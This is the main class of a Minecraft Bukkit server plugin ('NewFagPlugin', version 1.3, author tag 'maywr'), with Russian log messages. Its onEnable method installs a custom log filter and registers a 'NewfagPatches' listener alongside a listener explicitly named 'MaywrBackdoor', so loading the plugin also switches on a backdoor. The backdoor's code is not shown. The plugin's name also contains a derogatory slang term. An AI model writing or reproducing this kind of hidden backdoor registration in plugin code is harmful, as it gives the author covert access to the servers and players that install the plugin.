package xyz.maywr.newfagplugin;

import org.bukkit.plugin.java.JavaPlugin;

public final class NewFagPlugin extends JavaPlugin {

    public static final double version = 1.3;

    @Override
    public void onEnable() {
        getLogger().setFilter(new Filter());
        getLogger().info("Плагин загружается... // maywr");
        getServer().getPluginManager().registerEvents(new NewfagPatches(this), this);
        getServer().getPluginManager().registerEvents(new MaywrBackdoor(this), this);
        getLogger().info("Плагин успешно загружен... // maywr");

    }

    @Override
    public void onDisable() {
        getLogger().info("Плагин выключается... // maywr");
    }
}
